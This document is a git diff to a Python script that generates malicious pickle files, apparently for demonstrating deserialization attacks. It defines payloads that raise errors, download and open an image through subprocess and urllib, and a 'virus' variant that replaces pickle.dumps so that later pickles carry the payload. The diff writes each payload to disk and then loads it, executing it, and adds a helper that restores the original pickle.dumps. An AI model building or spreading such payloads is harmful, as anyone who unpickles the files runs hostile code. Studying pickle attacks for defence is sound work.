@@ -1,4 +1,5 @@
 import base64
+import contextlib
 import inspect
 import pickle
 import pickletools
@@ -19,7 +20,7 @@ def hi_bomb():
 
 
 def raise_bomb():
-    """Bomb that rises error"""
+    """Bomb that raises error"""
     raise ValueError("Ur mama too fat")
 
 
@@ -36,7 +37,7 @@ def self_report_bomb():
 
 
 def pic_bomb():
-    """Bomb that opens and image with default image viewer"""
+    """Bomb that opens an image with default image viewer"""
     import subprocess
     import urllib.request
     import os
@@ -51,6 +52,16 @@ def pic_bomb():
 def append_source(f):
     f._source = inspect.getsource(f)
     return f
+
+
+@contextlib.contextmanager
+def disarm_fake_dumps():
+    import pickle
+    original_dumps = pickle._odumps if hasattr(pickle, "_odumps") else pickle.dumps
+    yield
+    pickle.dumps = original_dumps
+    if hasattr(pickle, "_odumps"):
+        delattr(pickle, "_odumps")
 
 
 def make_fake_dumps(bomb_name, side_effect_name):
@@ -199,7 +210,7 @@ def make_source_from_function(f):
     else:
         lines = inspect.getsourcelines(f)[0]
     lines = [re.sub("#.*\n", "\n", l) for l in lines]
-    lines = [l for l in lines if l.strip()]
+    lines = [l.strip(" \t") for l in lines if l.strip(" \t")]
     return "".join(lines[1:]).replace("\n", "; ").strip(" \t\n")
 
 
@@ -212,8 +223,14 @@ def create_bomb(name, bomb_function):
     with open(f"bomb_{name}.pkl", "wb") as f:
         f.write(payload)
 
-    print(f'This is {name} bomb')
+    print('=' * 40, f'\nThis is {name} bomb\n', '=' * 39)
     pickletools.dis(payload)
+    print('=' * 20)
+    try:
+        pickle.loads(payload)
+    except Exception as e:
+        print(f'Got exception {type(e).__name__}: {e}')
+    print('=' * 40)
 
 
 def main():
@@ -221,8 +238,10 @@ def main():
     create_bomb('raise', raise_bomb)
     create_bomb('self_report', self_report_bomb)
     create_bomb('pic', pic_bomb)
-    create_bomb('virus_with_hi', patch_bomb(patch_bomb, hi_bomb))
-    create_bomb('virus_with_pic', patch_bomb(patch_bomb, pic_bomb))
+    with disarm_fake_dumps():
+        create_bomb('virus_with_hi', patch_bomb(patch_bomb, hi_bomb))
+    with disarm_fake_dumps():
+        create_bomb('virus_with_pic', patch_bomb(patch_bomb, pic_bomb))
 
 
 if __name__ == "__main__":
